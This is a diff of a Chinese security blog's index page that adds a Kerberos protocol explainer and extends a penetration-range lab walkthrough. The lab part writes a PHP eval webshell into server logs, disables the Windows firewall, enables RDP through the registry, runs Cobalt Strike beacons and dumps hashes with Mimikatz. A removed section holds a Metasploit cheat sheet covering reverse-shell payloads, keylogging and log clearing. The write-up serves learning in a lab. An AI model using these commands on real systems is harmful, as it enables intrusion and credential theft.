@@ -149,6 +149,125 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/" class="post-title-link" itemprop="url">域渗透之kerberos协议</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-25 09:51:20 / 修改时间：10:50:37" itemprop="dateCreated datePublished" datetime="2021-05-25T09:51:20+08:00">2021-05-25</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-Kerberos简介"><a href="#0x01-Kerberos简介" class="headerlink" title="0x01 Kerberos简介"></a>0x01 Kerberos简介</h1><p>Kerberos认证中，最主要的问题是如何证明“你是你”的问题，当一个Client去访问Server上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截/篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也至关重要。</p>
+<h2 id="1-Kerberos协议框架"><a href="#1-Kerberos协议框架" class="headerlink" title="1.Kerberos协议框架"></a>1.<strong>Kerberos协议框架</strong></h2><p>在Kerberos协议中主要是有三个角色的存在：</p>
+<ul>
+<li><p>访问服务的Client</p>
+</li>
+<li><p>提供服务的Server</p>
+</li>
+<li><p>KDC（Key Distribution Center）密钥分发中心</p>
+<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/1.jpg"></p>
+</li>
+</ul>
+<p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票只有一张。</p>
+<p>由上图中可以看到<strong>KDC又分为两个部分</strong>：</p>
+<p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张<strong>TGT</strong>（Ticket Granting Ticket）票给Client。</p>
+<p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/2.jpg"></p>
+<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/3.jpg"></p>
+<h2 id="2-Kerberos认证-ticket-system"><a href="#2-Kerberos认证-ticket-system" class="headerlink" title="2. Kerberos认证-ticket system"></a>2. Kerberos认证-ticket system</h2><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p>
+<p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p>
+<p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p>
+<p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/4.jpg"></p>
+<p><strong>(1)TheAuthentication Service Exchange</strong></p>
+<p>KRB_AS_REQ</p>
+<p>Client-&gt;AS：发送 Authenticator1(Client 密码加密 TimeStamp)</p>
+<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/5.jpg"></p>
+<p>KRB_AS_REP</p>
+<p>AS-&gt; Client：发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
+<p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p>
+<p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p>
+<p>KRB_TGS_REQ</p>
+<p>Client -&gt;TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
+<p>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/6.jpg"></p>
+<p>KRB_TGS_REP</p>
+<p>TGS-&gt; Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
+<p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p>
+<p><strong>(3)TheClient/Server Authentication Exchange</strong></p>
+<p>KRB_AP_REQ</p>
+<p>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
+<p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p>
+<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/7.jpg"></p>
+<h1 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h1><p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/196434.html">https://www.freebuf.com/articles/system/196434.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -278,7 +397,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-22 21:36:22" itemprop="dateModified" datetime="2021-05-22T21:36:22+08:00">2021-05-22</time>
+                <time title="修改时间：2021-05-24 21:16:10" itemprop="dateModified" datetime="2021-05-24T21:16:10+08:00">2021-05-24</time>
               </span>
 
           <br>
@@ -287,14 +406,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.4k</span>
+              <span>3.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -368,8 +487,6 @@
 <p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
 <p><img src="/2021/05/14/PenetrationRange/20.png"></p>
 <p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
-<h3 id="漏洞六：yxcms后台SQL注入漏洞"><a href="#漏洞六：yxcms后台SQL注入漏洞" class="headerlink" title="漏洞六：yxcms后台SQL注入漏洞"></a>漏洞六：yxcms后台SQL注入漏洞</h3><p>待补充。其他博客的资料此处有问题。</p>
-<p>前渗透到此结束，下面为后渗透流程</p>
 <h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
 <p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
 <p><img src="/2021/05/14/PenetrationRange/21.png"></p>
@@ -377,8 +494,76 @@
 <p>选择监听器，为后头生成木马做铺垫</p>
 <p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
 <p><img src="/2021/05/14/PenetrationRange/23.png"></p>
-<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。</p>
+<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。发现是监听主机选错了，当然是要选择攻击方(服务器)。当然记得要选择为64位。</p>
+<p>tips:</p>
+<p>相同文件名的shell，蚁剑会上传失败。</p>
 <p><img src="/2021/05/14/PenetrationRange/24.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/25.png"></p>
+<p>终于提权成功了。</p>
+<h2 id="0x04-后渗透之系统信息收集"><a href="#0x04-后渗透之系统信息收集" class="headerlink" title="0x04 后渗透之系统信息收集"></a>0x04 后渗透之系统信息收集</h2><p>对这台主机进行信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell ipconfig/all</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/26.png"></p>
+<p>我们知道140是外网，还发现52网段。域是god.org，说明当前主机是在域内的，初步判断域名为god.org.</p>
+<blockquote>
+<p>内网信息收集：</p>
+<p>查询主机名：whoami，hostname</p>
+<p>查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%</p>
+<p>查看当前运行进程：wmic process list brief</p>
+<p>域相关：</p>
+<p>查询本地所有用户：net user</p>
+<p>查看域内所有用户列表：net group /domain  </p>
+<p>进入域：net group /domain:god</p>
+<p>查看域成员计算机列表：net group “domain computers” /domain<br>查看域管理员用户，也就是域控：net group “domain admins” /domain </p>
+<p>参考：<a target="_blank" rel="noopener" href="https://article.itxueyuan.com/56bEWk">https://article.itxueyuan.com/56bEWk</a></p>
+</blockquote>
+<p>查看本机名，hostname,架构，域信息等，CSshell执行命令实在是太慢了，最好用蚁剑吧。后来发现是自己没改sleep时间，一般改成5就行。</p>
+<p>查看是否有常见的杀毒软件</p>
+<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/27.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/28.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/29.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/30.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/31.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/32.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/33.png"></p>
+<p>本机计算机名为STU1，还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<h3 id="1-主机密码收集"><a href="#1-主机密码收集" class="headerlink" title="1. 主机密码收集"></a>1. 主机密码收集</h3><p>获取win7系统用户名和密码</p>
+<p>连接右键-&gt;Access-&gt;Run Mimikaz/Dump Hashes</p>
+<p>view -&gt; Credentials</p>
+<p><img src="/2021/05/14/PenetrationRange/34.png"></p>
+<h3 id="2-远程桌面登陆"><a href="#2-远程桌面登陆" class="headerlink" title="2.远程桌面登陆"></a>2.远程桌面登陆</h3><p>要使用远程桌面登陆的话，得远程开启对方的3389端口，不妨试试。因为之前防火墙已经关了，所以此时不再需要。</p>
+<p><img src="/2021/05/14/PenetrationRange/35.png"></p>
+<p>whoami的信息是god\administrator，密码是Security1</p>
+<p>此时远程桌面登陆：</p>
+<p><img src="/2021/05/14/PenetrationRange/36.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/37.png"></p>
+<p>尝试多次一直登陆失败，是把用户名记成god，执行whoami看到是god\administrator。</p>
+<blockquote>
+<p>注：</p>
+<p>注册表开启3389端口：<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t  REG_DWORD /d 00000000 /f</p>
+<p>关闭防火墙：</p>
+<p>winsows server 2003 之前：</p>
+<p>netsh firewall set opmode disable       </p>
+<p>winsows server 2003 之后：<br>netsh advfirewall set allprofiles state off     </p>
+</blockquote>
+<h2 id="0x05-内网信息收集"><a href="#0x05-内网信息收集" class="headerlink" title="0x05 内网信息收集"></a>0x05 内网信息收集</h2><ul>
+<li><p> 域控制用户：OWA</p>
+</li>
+<li><p>本机计算机：STU1，</p>
+</li>
+<li><p>域成员：DEV1、ROOT-TVI862UBEH</p>
+</li>
+</ul>
+<p>远程登陆之后发现win7已安装nmap，不妨利用起来，直接进行内网扫描。nmap -sP。在此一提，其实CS 右键Explore -&gt; Desktop(VNC)也可以直接远程桌面，感概CS的强大。</p>
+<p>k8师傅的Ladon也可以直接进行内网扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.52.0&#x2F;24 OnlinePC</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/38.png"></p>
+<p>beacon上右键-&gt;Explore -&gt; PortScan</p>
+<p><img src="/2021/05/14/PenetrationRange/39.png"></p>
+<p>icmp扫描完之后，在view-&gt;target选项即可看到内网存活主机。</p>
+<p><img src="/2021/05/14/PenetrationRange/40.png"></p>
 
       
     </div>
@@ -1986,177 +2171,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/01/msf/" class="post-title-link" itemprop="url">metasploit(MSF)初始化及常用命令</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-01 21:50:29 / 修改时间：22:07:36" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用PostgreSQL作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
-<h1 id="0x03-常用命令"><a href="#0x03-常用命令" class="headerlink" title="0x03 常用命令"></a>0x03 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
-<li>help<br>打开meterpreter使用帮助。</li>
-<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
-<li>sysinfo<br>列出受控主机的系统信息。</li>
-<li>ls<br>列出目标主机的文件和文件夹信息。</li>
-<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
-<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
-<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
-<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
-<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
-<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
-<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
-<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
-<li>drop_token<br>停止假冒当前令牌。</li>
-<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
-<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
-<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
-<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
-<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
-<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
-<li>screenshot<br>对目标主机的屏幕进行截图。</li>
-<li>upload file<br>向目标主机上传文件。</li>
-<li>download file<br>从目标主机下载文件。</li>
-<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
-<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
-<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
-<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
-<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
-<li>background<br>将你当前的metasploit shell转为后台执行。</li>
-<li>hashdump<br>导出目标主机中的口令哈希值。</li>
-<li>use sniffer<br>加载嗅探模式。</li>
-<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
-<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
-<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
-<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
-<li>sniffer_stop interfaceID<br>停止嗅探。</li>
-<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
-<li>clearev<br>清楚目标主机上的日志记录。</li>
-<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
-<li>reboot<br>重启目标主机。</li>
-</ul>
-<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
-<li>msfpayload -h<br>msfpayload的帮助信息。</li>
-<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
-<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
-<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
-<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
-<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
-</ul>
-<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
-<li>mefencode -h<br>列出msfencode的帮助命令。</li>
-<li>msfencode -l<br>列出所有可用的编码器。</li>
-<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
-<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
-<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
-<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
-</ul>
-<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
-<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
-<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
-<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
-</ul>
-<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
-<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
-<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
-<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
-<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
-<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
-<li>use name<br>装载一个渗透攻击或模块。</li>
-<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
-<li>RHOST<br>远程主机或是目标主机。</li>
-<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
-<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
-<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
-<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
-<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
-<li>set payload name<br>指定想要使用的攻击载荷。</li>
-<li>show advanced<br>列出所有高级配置选项。</li>
-<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
-<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
-<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
-<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
-<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
-<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
-<li>exploit -h<br>列出exploit命令的帮助信息。</li>
-<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
-<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
-<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
-<li>sessions -K<br>杀死所有活跃的交互会话。</li>
-<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
-<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
-<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
-<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
-<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
-<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
-<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
-<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2226,7 +2240,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2235,7 +2249,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-count">45</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
